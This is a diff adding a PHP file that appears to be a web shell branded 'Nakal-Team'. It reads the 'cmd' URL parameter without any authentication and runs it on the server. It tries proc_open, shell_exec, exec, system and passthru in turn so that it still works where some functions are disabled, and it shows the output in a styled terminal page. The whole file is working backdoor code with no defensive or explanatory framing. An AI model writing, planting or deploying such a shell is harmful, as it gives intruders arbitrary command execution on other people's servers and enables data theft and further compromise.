@@ -1,0 +1,135 @@
+<?php
+/**
+ * Terminal Console Multi Run | Nakal-Team Project
+ */
+
+function is_fn_usable($fn) {
+    $disabled = explode(',', ini_get('disable_functions'));
+    return function_exists($fn) && !in_array($fn, $disabled) && is_callable($fn);
+}
+
+function execute_cmd($cmd) {
+    $cmd = $cmd . ' 2>&1';
+    
+    if (is_fn_usable('proc_open')) {
+        $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+        $process = proc_open($cmd, $descriptors, $pipes);
+        if (is_resource($process)) {
+            $out = stream_get_contents($pipes[1]);
+            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
+            proc_close($process);
+            return $out;
+        }
+    }
+
+    if (is_fn_usable('shell_exec')) return shell_exec($cmd);
+    if (is_fn_usable('exec')) { exec($cmd, $out); return implode("\n", $out); }
+    if (is_fn_usable('system')) { ob_start(); system($cmd); return ob_get_clean(); }
+    if (is_fn_usable('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
+
+    return "❌ Functions disabled.";
+}
+
+$command = $_GET['cmd'] ?? '';
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Terminal Comand | Seo Nakal-Team</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            background-color: #1a1a1a; 
+            color: #f8f8f2; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            padding: 40px;
+            display: flex;
+            justify-content: center;
+        }
+        .container { 
+            width: 100%; 
+            max-width: 900px; 
+        }
+        .terminal-window {
+            background: #282a36;
+            border-radius: 8px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            overflow: hidden;
+            border: 1px solid #44475a;
+        }
+        .terminal-header {
+            background: #44475a;
+            padding: 10px 15px;
+            display: flex;
+            gap: 8px;
+        }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .red { background: #ff5555; }
+        .yellow { background: #f1fa8c; }
+        .green { background: #50fa7b; }
+        
+        form {
+            display: flex;
+            padding: 20px;
+            background: #282a36;
+            align-items: center;
+        }
+        .prompt { color: #50fa7b; font-weight: bold; margin-right: 10px; font-family: monospace; }
+        input[type="text"] {
+            background: transparent;
+            border: none;
+            color: #f8f8f2;
+            font-family: 'Fira Code', monospace;
+            font-size: 16px;
+            flex: 1;
+            outline: none;
+        }
+        .output-area {
+            padding: 0 20px 20px 20px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        pre {
+            margin: 0;
+            padding: 15px;
+            background: #1e1f29;
+            color: #bd93f9;
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border-left: 3px solid #6272a4;
+        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-thumb { background: #44475a; border-radius: 4px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="terminal-window">
+        <div class="terminal-header">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+            <span style="margin-left: 10px; font-size: 12px; color: #6272a4;">bash — php-terminal multi run</span>
+        </div>
+        
+        <form method="GET">
+            <span class="prompt">gasbray@server:~ $</span>
+            <input type="text" name="cmd" value="<?= htmlspecialchars($command) ?>" autofocus autocomplete="off">
+        </form>
+
+        <?php if ($command): ?>
+        <div class="output-area">
+            <pre><?= htmlspecialchars(execute_cmd($command)) ?: "[No Output]" ?></pre>
+        </div>
+        <?php endif; ?>
+    </div>
+</div>
+
+</body>
+</html>
